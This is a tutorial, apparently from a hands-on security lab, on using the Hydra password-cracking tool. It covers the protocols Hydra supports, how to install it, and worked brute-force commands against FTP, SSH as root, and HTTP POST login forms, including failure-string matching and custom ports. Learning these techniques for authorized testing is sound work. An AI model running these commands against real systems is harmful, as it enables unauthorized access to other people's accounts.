## What is Hydra
Hydra is basically an online brute force password cracking tool, its used to speed up guessing login passwords for different services instead of trying them manually one by one. If you had to manually guess someones password on something like ssh a web form ftp or snmp itd take forever, hydra runs through a password list against the target and finds the right one way faster

According to its official repo hydra supports a huge range of protocols including asterisk afp cisco aaa cisco auth cisco enable cvs firebird ftp http form get http form post http get http head http post http proxy https versions of those same forms icq imap irc ldap memcached mongodb ms sql mysql ncp nntp oracle listener oracle sid oracle pc anywhere pcnfs pop3 postgres radmin rdp rexec rlogin rsh rtsp sap r3 sip smb smtp smtp enum snmp v1 v2 v3 socks5 ssh v1 and v2 sshkey subversion teamspeak ts2 telnet vmware auth vnc and xmpp

This basically proves why weak passwords are such a problem, if a password is common doesnt have special characters and is under eight characters its pretty easy to guess with a big enough list. A hundred million password list full of common passwords is enough to crack a lot of out of the box logins, this is exactly why default creds like admin password on cctv cameras or web frameworks need to be changed immediately instead of left as is

## Installing Hydra
Its already installed on the attackbox by default. On other distros it can be installed with apt install hydra on ubuntu or dnf install hydra on fedora, or downloaded straight from the official hydra repository if needed

## Hydra Command Basics
Whatever options you pass into hydra depend entirely on which service or protocol youre targeting. Basic ftp brute force example with username user and a password list called passlist.txt

```
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

## Brute Forcing SSH
```
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```

- -l — specifies the ssh username to use
- -P — points to the password list
- -t — sets how many threads run in parallel

So something like hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh means hydra logs in attempts as root tries every password inside passwords.txt and runs 4 threads at once to speed things up

## Brute Forcing a POST Web Form
Before brute forcing a web form you need to know if its using get or post, this can be checked through the network tab in browser dev tools or by checking the page source directly

```
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```

- -l — the username for the web form login
- -P — the password list to use
- http-post-form — tells hydra the form uses post method
- path — the actual login page url like login.php
- login_credentials — the field names for username and password like username=^USER^&password=^PASS^
- invalid_response — a string that shows up in the response specifically when login fails
- -V — verbose output so you see every single attempt as it happens

A concrete example brute forcing a post login form

```
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

Here the login page is just / meaning the root of the site. Username is the form field for entering a username and gets replaced by whatever hydra is currently trying through ^USER^. Password is the form field for the password and gets replaced through ^PASS^. F=incorrect is the specific string that shows up in the servers response whenever a login attempt fails, hydra uses this to know when an attempt was wrong versus successful

If the web server happens to be running on a non default port you can specify it directly with -s

```
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
```